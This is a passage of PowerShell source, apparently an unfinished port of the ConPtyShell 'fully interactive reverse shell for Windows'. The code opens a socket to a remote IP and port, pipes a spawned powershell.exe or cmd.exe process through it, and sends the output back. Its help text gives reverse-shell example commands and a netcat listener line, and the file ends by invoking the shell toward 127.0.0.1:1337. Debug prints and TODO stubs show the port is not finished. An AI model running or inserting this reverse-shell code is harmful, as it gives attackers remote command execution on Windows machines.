        $hStdout = $kernel32::CreateFile("CONOUT$", [ConPtyShell]::GENERIC_READ -bor [ConPtyShell]::GENERIC_WRITE, [ConPtyShell]::FILE_SHARE_READ -bor [ConPtyShell]::FILE_SHARE_WRITE, [IntPtr]::Zero, [ConPtyShell]::OPEN_EXISTING, [ConPtyShell]::FILE_ATTRIBUTE_NORMAL, [IntPtr]::Zero);
        $hStdin =  $kernel32::CreateFile("CONIN$",  [ConPtyShell]::GENERIC_READ -bor [ConPtyShell]::GENERIC_WRITE, [ConPtyShell]::FILE_SHARE_READ -bor [ConPtyShell]::FILE_SHARE_WRITE, [IntPtr]::Zero, [ConPtyShell]::OPEN_EXISTING, [ConPtyShell]::FILE_ATTRIBUTE_NORMAL, [IntPtr]::Zero);

        $Kernel32::SetStdHandle([ConPtyShell]::STD_OUTPUT_HANDLE, $hStdout);
        $Kernel32::SetStdHandle([ConPtyShell]::STD_ERROR_HANDLE, $hStdout);
        $Kernel32::SetStdHandle([ConPtyShell]::STD_INPUT_HANDLE, $hStdin);
    }

    
#    hidden static [void] ThreadReadPipeWriteSocketOverlapped([object] $threadParams) {
    # hidden static [void] ThreadReadPipeWriteSocketOverlapped([IntPtr] $OutputPipeRead, [IntPtr] $shellSocket) {
    #     #object[] $threadParameters = (object[])threadParams;
    #     # $threadParameters = $threadParams
    #     # [IntPtr] $OutputPipeRead = [IntPtr]$threadParameters[0]
    #     # [IntPtr] $shellSocket = [IntPtr]$threadParameters[1]

    #     Write-Host "Hi everyone !"
        
    #     [UInt32] $bufferSize = 8192
    #     [Bool]   $readSuccess = $false
    #     [Int32]  $bytesSent = 0
    #     [UInt32] $dwBytesRead = 0
    #     do
    #     {
    #         [byte[]] $bytesToWrite = New-Object Byte[] $bufferSize
    #         $readSuccess = $global:Kernel32::ReadFile($OutputPipeRead, $bytesToWrite, $bufferSize, $dwBytesRead, [IntPtr]::Zero)
    #         $bytesSent = $global:Kernel32::send($shellSocket, $bytesToWrite, $dwBytesRead, 0)
    #     } while ($bytesSent -gt 0 -and $readSuccess)
    #     # Console.WriteLine("debug: bytesSent = " + bytesSent + " WSAGetLastError() = " + WSAGetLastError().ToString());
    # }

    #hidden static [System.Threading.Thread] StartThreadReadPipeWriteSocket([IntPtr] $OutputPipeRead, [IntPtr] $shellSocket, [bool] $overlappedSocket)
    hidden static [System.Management.Automation.Job] StartThreadReadPipeWriteSocket([IntPtr] $OutputPipeRead, [IntPtr] $shellSocket, [bool] $overlappedSocket)
    {
        $ThreadReadPipeWriteSocketOverlapped = {
            param($OutputPipeRead, $shellSocket)

            [UInt32] $bufferSize = 8192
            [Bool]   $readSuccess = $false
            [Int32]  $bytesSent = 0
            [UInt32] $dwBytesRead = 0
            do
            {
                [byte[]] $bytesToWrite = New-Object Byte[] $bufferSize
                $readSuccess = $global:Kernel32::ReadFile($OutputPipeRead, $bytesToWrite, $bufferSize, $dwBytesRead, [IntPtr]::Zero)
                $bytesSent = $global:Kernel32::send($shellSocket, $bytesToWrite, $dwBytesRead, 0)
            } while ($bytesSent -gt 0 -and $readSuccess)
            
        }
    
        if($overlappedSocket) {
            $job = Start-Job -ScriptBlock $ThreadReadPipeWriteSocketOverlapped -ArgumentList $OutputPipeRead, $shellSocket
        } else {
            $job = $null
            Write-Host "Domache"
        }

        Write-Host "job: " $job.GetType()

        # Wait-Job $job
        # Receive-Job $job
        # Get-Job $job

        return $job
    }

    static [string] SpawnConPtyShell([string] $remoteIp, [uint32] $remotePort, [uint32] $rows, [uint32] $cols, [string] $commandLine, [bool] $upgradeShell) {

        [IntPtr] $shellSocket = [IntPtr]::Zero
        [IntPtr] $InputPipeRead = [IntPtr]::Zero
        [IntPtr] $InputPipeWrite = [IntPtr]::Zero
        [IntPtr] $OutputPipeRead = [IntPtr]::Zero
        [IntPtr] $OutputPipeWrite = [IntPtr]::Zero
        [IntPtr] $handlePseudoConsole = [IntPtr]::Zero
        [IntPtr] $oldStdIn  = [IntPtr]::Zero
        [IntPtr] $oldStdOut = [IntPtr]::Zero
        [IntPtr] $oldStdErr = [IntPtr]::Zero
        [bool] $newConsoleAllocated = $false
        [bool] $parentSocketInherited = $false
        [bool] $grandParentSocketInherited = $false
        [bool] $conptyCompatible = $false
        [bool] $IsSocketOverlapped = $true
        [string] $output = ""
        [System.Diagnostics.Process] $currentProcess = $null
        [System.Diagnostics.Process] $parentProcess = $null
        [System.Diagnostics.Process] $grandParentProcess = $null


        $Kernel32 = $global:Kernel32
        $ntdll = $global:ntdll

        $kernel32base = $Kernel32::GetModuleHandle('kernel32')

        [bool] $conptyCompatible = $false
        if ($Kernel32::GetProcAddress($kernel32base, 'CreatePseudoConsole') -ne [IntPtr]::Zero) {
            $conptyCompatible = $true
        }
        $childProcessInfo = New-Object -TypeName "PROCESS_INFORMATION"

        [ConPtyShell]::CreatePipes([ref] $InputPipeRead, [ref] $InputPipeWrite, [ref] $OutputPipeRead, [ref] $OutputPipeWrite)

        # comment the below function to debug errors
        [ConPtyShell]::InitConsole([ref] $oldStdIn, [ref] $oldStdOut, [ref] $oldStdErr)
        # init wsastartup stuff for this thread
        [ConPtyShell]::InitWSAThread();

        # TODO Write CreatePseudoConsle part
        if ($false) { #$conptyCompatible) {
            Write-Host "CreatePseudoConsole function found! Spawning a fully interactive shell" -ForegroundColor Green

            [ConPtyShell]::TryParseRowsColsFromSocket($shellSocket, [ref] $rows, [ref] $cols)
        } else {

            if ($upgradeShell) {
                Write-Host "Could not upgrade shell to fully interactive because ConPTY is not compatible on this system" -ForegroundColor Red
                return ""
            }
            
            $shellSocket = [ConPtyShell]::connectRemote($remoteIp, $remotePort)
            if ($shellSocket -eq [IntPtr]::Zero) {
                Write-Host "ConPtyShellException: Could not connect to ip $remoteIp on port $remotePort" -ForegroundColor Red
                return ""
            }

            Write-Host "CreatePseudoConsole function not found! Spawning a netcat-like interactive shell..." -ForegroundColor Yellow

            $sInfo = New-Object -TypeName STARTUPINFO
            $sInfo.cb = $global:STARTUPINFO::GetSize()
            $sInfo.dwFlags = $sInfo.dwFlags -bor [ConPtyShell]::STARTF_USESTDHANDLES
            $sInfo.hStdInput  = $InputPipeRead
            $sInfo.hStdOutput = $OutputPipeWrite
            $sInfo.hStdError  = $OutputPipeWrite

            $Kernel32::CreateProcess($null, $commandLine, [IntPtr]::Zero, [IntPtr]::Zero, $true, 0, [IntPtr]::Zero, $null, [ref] $sInfo, [ref] $childProcessInfo);
        }

        # Note: We can close the handles to the PTY-end of the pipes here
        # because the handles are dup'ed into the ConHost and will be released
        # when the ConPTY is destroyed.
        if ($InputPipeRead -ne [IntPtr]::Zero) {$Kernel32::CloseHandle($InputPipeRead)}
        if ($OutputPipeWrite -ne [IntPtr]::Zero) {$Kernel32::CloseHandle($OutputPipeWrite)}

        if ($upgradeShell) {
            # we need to suspend other processes that can interact with the duplicated sockets if any. This will ensure stdin, stdout and stderr is read/write only by our conpty process
            if ($parentSocketInherited) {$ntdll::NtSuspendProcess($parentProcess.Handle)}
            if ($grandParentSocketInherited) {$ntdll::NtSuspendProcess($grandParentProcess.Handle)}
            if (! $IsSocketOverlapped) {
                Write-Host "Todo!" -ForegroundColor Yellow # TODO
            }
        }
        # Let's use Job, it seems easier than dealing with Threads in Powershell
        [System.Management.Automation.Job] $thThreadReadPipeWriteSocket = [ConPtyShell]::StartThreadReadPipeWriteSocket($OutputPipeRead, $shellSocket, $IsSocketOverlapped)
        #[System.Management.Automation.Job] $thThreadReadSocketWritePipe = [ConPtyShell]::StartThreadReadSocketWritePipe($InputPipeWrite, $shellSocket, $childProcessInfo.hProcess, $IsSocketOverlapped)
        
        # wait for the child process until exit


        $LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
        Write-Host "Err msg: " $LastError.Message

        Write-Host "remoteIP: $remoteIp, remotePort: $remotePort, rows: $rows, cols: $cols, cmdLine $commandLine, upShell $upgradeShell"

        if ($handlePseudoConsole -ne [IntPtr]::Zero) {$Kernel32::ClosePseudoConsole($handlePseudoConsole)}
        if ($InputPipeWrite -ne [IntPtr]::Zero) {$Kernel32::CloseHandle($InputPipeWrite)}
        if ($OutputPipeRead -ne [IntPtr]::Zero) {$Kernel32::CloseHandle($OutputPipeRead)}

        Write-Host "ConPtyShell kindly exited"
        return ""
    }
}

class ConPtyShellMainClass {
    
    hidden static [void] DisplayHelp() {
        $help = @"
ConPtyShell - Fully Interactive Reverse Shell for Windows
Author: splinter_code
License: MIT
Source: https://github.com/antonioCoco/ConPtyShell
   
ConPtyShell - Fully interactive reverse shell for Windows
Properly set the rows and cols values. You can retrieve it from
your terminal with the command "stty size".
You can avoid to set rows and cols values if you run your listener
with the following command:
    stty raw -echo; (stty size; cat) | nc -lvnp 3001
If you want to change the console size directly from powershell
you can paste the following commands:
    `$width=80
    `$height=24
    `$Host.UI.RawUI.BufferSize = New-Object Management.Automation.Host.Size (`$width, `$height)
    `$Host.UI.RawUI.WindowSize = New-Object -TypeName System.Management.Automation.Host.Size -ArgumentList (`$width, `$height)
Usage:
    ConPtyShell.ps1 -RemoteIp <ip> -RemotePort <port> [-Rows <rows>] [-Cols <cols>] [-CommandLine <command>]
Positional arguments:
    RemoteIp                The remote ip to connect
    RemotePort              The remote port to connect
    [Rows]                  Rows size for the console
                            Default: "24"
    [Cols]                  Cols size for the console
                            Default: "80"
    [CommandLine]           The commandline of the process that you are going to interact
                            Default: "powershell.exe"
                           
Examples:
    Spawn a reverse shell
        .\ConPtyShell.ps1 -RemoteIp 10.0.0.2 -RemotePort 3001
   
    Spawn a reverse shell with specific rows and cols size
        .\ConPtyShell.ps1 -RemoteIp 10.0.0.2 -RemotePort 3001 -Rows 30 -Cols 90
   
    Spawn a reverse shell (cmd.exe) with specific rows and cols size
        .\ConPtyShell.ps1 -RemoteIp 10.0.0.2 -RemotePort 3001 -Rows 30 -Cols 90 -CommandLine cmd.exe
"@

        Write-Host $help
    }

    hidden static [bool] HelpRequired([string] $param) {
        return ($param -eq "-h") -or ($param -eq "--help") -or ($param -eq "/?")
    }

    hidden static [void] CheckArgs([string[]] $arguments) {
        if ($arguments.Length -lt 2) {
            throw [ConPtyShellException] "Not enough arguments. 2 Arguments required. Use --help for additional help."
        }
    }

    hidden static [string] CheckRemoteIpArg([string] $ipString) {
        try {
            [System.Net.IPAddress]::Parse($ipString)
        } catch {
            throw [ConPtyShellException] "Invalid remoteIp value $ipString"
        }

        return $ipString
    }

    hidden static [uint32] CheckUint([string] $arg) {
        try {
            return [uint32]$arg
        } catch {
            throw [ConPtyShellException] "Invalid unsigned integer value $arg"
        }
    }

    hidden static [uint32] ParseRows([string[]] $arguments) {
        [uint32] $rows = 24;
        if ($arguments.Length -gt 2) {
            $rows = [ConPtyShellMainClass]::CheckUint($arguments[2]);
        }
        return $rows;
    }

    hidden static [uint32] ParseCols([string[]] $arguments) {
        [uint32] $cols = 80;
        if ($arguments.Length -gt 3) {
            $cols = [ConPtyShellMainClass]::CheckUint($arguments[3]);
        }
        return $cols;
    }

    hidden static [string] ParseCommandLine([string[]] $arguments) {
        [string] $commandLine = "powershell.exe"

        if ($arguments.Length -gt 4) {
            $commandLine = $arguments[4]
        }
        return $commandLine
    }

    static [string] ConPtyShellMain([string[]] $arguments) {
        [string] $output = "" 
        
        if ($arguments.Length -eq 1 -and [ConPtyShellMainClass]::HelpRequired($arguments[0])) {
            [ConPtyShellMainClass]::DisplayHelp()
        } else {
            [string] $remoteIp = ""
            [int] $remotePort = 0
            [bool] $upgradeShell = $false

            try {
                [ConPtyShellMainClass]::CheckArgs($arguments)
                
                if (($arguments[0]).Contains("upgrade")) {
                    $upgradeShell = $true
                } else {
                    $remoteIp = [ConPtyShellMainClass]::CheckRemoteIpArg($arguments[0])
                    $remotePort = [ConPtyShellMainClass]::CheckUint($arguments[1])
                }

                [uint32] $rows = [ConPtyShellMainClass]::ParseRows($arguments)
                [uint32] $cols = [ConPtyShellMainClass]::ParseCols($arguments)
                [string] $commandLine = [ConPtyShellMainClass]::ParseCommandLine($arguments)

                $output = [ConPtyShell]::SpawnConPtyShell($remoteIp, $remotePort, $rows, $cols, $commandLine, $upgradeShell)
            } catch {
                Write-Host $_.Exception.ToString()
            }
        }

       return $output
    }
}

function Invoke-ConPtyShell
{   
    <#
        .SYNOPSIS
            ConPtyShell - Fully Interactive Reverse Shell for Windows 
            Author: splinter_code
            License: MIT
            Source: https://github.com/antonioCoco/ConPtyShell
        
        .DESCRIPTION
            ConPtyShell - Fully interactive reverse shell for Windows
            
            Properly set the rows and cols values. You can retrieve it from
            your terminal with the command "stty size".
            
            You can avoid to set rows and cols values if you run your listener
            with the following command:
                stty raw -echo; (stty size; cat) | nc -lvnp 3001
           
            If you want to change the console size directly from powershell
            you can paste the following commands:
                $width=80
                $height=24
                $Host.UI.RawUI.BufferSize = New-Object Management.Automation.Host.Size ($width, $height)
                $Host.UI.RawUI.WindowSize = New-Object -TypeName System.Management.Automation.Host.Size -ArgumentList ($width, $height)
            
            
        .PARAMETER RemoteIp
            The remote ip to connect
        .PARAMETER RemotePort
            The remote port to connect
        .PARAMETER Rows
            Rows size for the console
            Default: "24"
        .PARAMETER Cols
            Cols size for the console
            Default: "80"
        .PARAMETER CommandLine
            The commandline of the process that you are going to interact
            Default: "powershell.exe"
            
        .EXAMPLE  
            PS>Invoke-ConPtyShell 10.0.0.2 3001
            
            Description
            -----------
            Spawn a reverse shell

        .EXAMPLE
            PS>Invoke-ConPtyShell -RemoteIp 10.0.0.2 -RemotePort 3001 -Rows 30 -Cols 90
            
            Description
            -----------
            Spawn a reverse shell with specific rows and cols size
            
         .EXAMPLE
            PS>Invoke-ConPtyShell -RemoteIp 10.0.0.2 -RemotePort 3001 -Rows 30 -Cols 90 -CommandLine cmd.exe
            
            Description
            -----------
            Spawn a reverse shell (cmd.exe) with specific rows and cols size
            
        .EXAMPLE
            PS>Invoke-ConPtyShell -Upgrade -Rows 30 -Cols 90
            
            Description
            -----------
            Upgrade your current shell with specific rows and cols size
            
    #>
    Param
    (
        [Parameter(Position = 0)]
        [String]
        $RemoteIp,
        
        [Parameter(Position = 1)]
        [String]
        $RemotePort,

        [Parameter()]
        [String]
        $Rows = "24",

        [Parameter()]
        [String]
        $Cols = "80",

        [Parameter()]
        [String]
        $CommandLine = "powershell.exe",
        
        [Parameter()]
        [Switch]
        $Upgrade
    )
    
    if( $PSBoundParameters.ContainsKey('Upgrade') ) {
        $RemoteIp = "upgrade"
        $RemotePort = "shell"
    }
    else{
  
        if(-Not($PSBoundParameters.ContainsKey('RemoteIp'))) {
            throw "RemoteIp missing parameter"
        }
        
        if(-Not($PSBoundParameters.ContainsKey('RemotePort'))) {
            throw "RemotePort missing parameter"
        }
    }
    $parametersConPtyShell = @($RemoteIp, $RemotePort, $Rows, $Cols, $CommandLine)
    $output = [ConPtyShellMainClass]::ConPtyShellMain($parametersConPtyShell)
    Write-Output $output
}

Invoke-ConPtyShell '127.0.0.1' 1337
